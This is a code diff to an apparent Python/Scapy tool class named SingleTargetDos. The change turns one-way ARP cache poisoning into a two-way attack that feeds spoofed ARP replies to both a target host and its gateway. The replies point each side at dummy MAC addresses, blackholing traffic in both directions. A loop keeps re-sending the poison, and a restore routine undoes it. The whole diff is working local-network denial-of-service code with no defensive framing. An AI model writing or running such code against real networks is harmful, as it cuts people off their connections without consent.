@@ -278,39 +278,56 @@ class SingleTargetDos:
         self.iface = iface
         self.is_running = False
         self.__thread = None
+        
+        # Distinct Dummy MACs for each side of the attack
+        self.dummy_target_mac = "de:ad:be:ef:00:01"
+        self.dummy_gateway_mac = "de:ad:be:ef:00:02"
 
-    def send_poison_packet(self):
-        """Sends a single spoofed ARP packet to the target."""
-        arp_to_target = Ether(
-            dst=self.target_mac,
-            src=self.attacker_mac) / ARP(
-            op=2,  # is-at
-            pdst=self.target_ip,
-            hwdst=self.target_mac,
+    def send_poison_packets(self):
+        """Poison both target and gateway using distinct dummy MACs."""
+        # 1. Tell Target that Gateway is at dummy MAC (Blackhole Outbound)
+        poison_target = Ether(dst=self.target_mac, src=self.attacker_mac) / ARP(
+            op=2,
             psrc=self.gateway_ip,
-            hwsrc=self.attacker_mac
+            hwsrc=self.dummy_gateway_mac,
+            pdst=self.target_ip,
+            hwdst=self.target_mac
         )
-        sendp(arp_to_target, iface=self.iface, verbose=False)
+        
+        # 2. Tell Gateway that Target is at dummy MAC (Blackhole Inbound)
+        poison_gateway = Ether(dst=self.gateway_mac, src=self.attacker_mac) / ARP(
+            op=2,
+            psrc=self.target_ip,
+            hwsrc=self.dummy_target_mac,
+            pdst=self.gateway_ip,
+            hwdst=self.gateway_mac
+        )
+        
+        sendp([poison_target, poison_gateway], iface=self.iface, verbose=False)
 
     def restore_tables(self):
-        """Restores the target's ARP table to the correct gateway mapping."""
-        arp_to_target = Ether(
-            dst=self.target_mac,
-            src=self.attacker_mac
-        ) / ARP(
-            op=2,  # is-at
-            pdst=self.target_ip,
-            hwdst=self.target_mac,
+        """Restores ARP tables for both sides surgically."""
+        restore_target = Ether(dst=self.target_mac, src=self.attacker_mac) / ARP(
+            op=2,
             psrc=self.gateway_ip,
-            hwsrc=self.gateway_mac
+            hwsrc=self.gateway_mac,
+            pdst=self.target_ip,
+            hwdst=self.target_mac
         )
-        sendp(arp_to_target, iface=self.iface, verbose=False)
+        restore_gateway = Ether(dst=self.gateway_mac, src=self.attacker_mac) / ARP(
+            op=2,
+            psrc=self.target_ip,
+            hwsrc=self.target_mac,
+            pdst=self.gateway_ip,
+            hwdst=self.gateway_mac
+        )
+        sendp([restore_target, restore_gateway], iface=self.iface, verbose=False, count=3)
 
     def poison_loop(self):
-        """Main loop that continuously sends poison packets."""
+        """Continuously sends poison packets."""
         while self.is_running:
-            self.send_poison_packet()
-            time.sleep(0.5) # Fast interval to ensure the cache stays poisoned
+            self.send_poison_packets()
+            time.sleep(1.5)
 
     def start(self):
         self.is_running = True
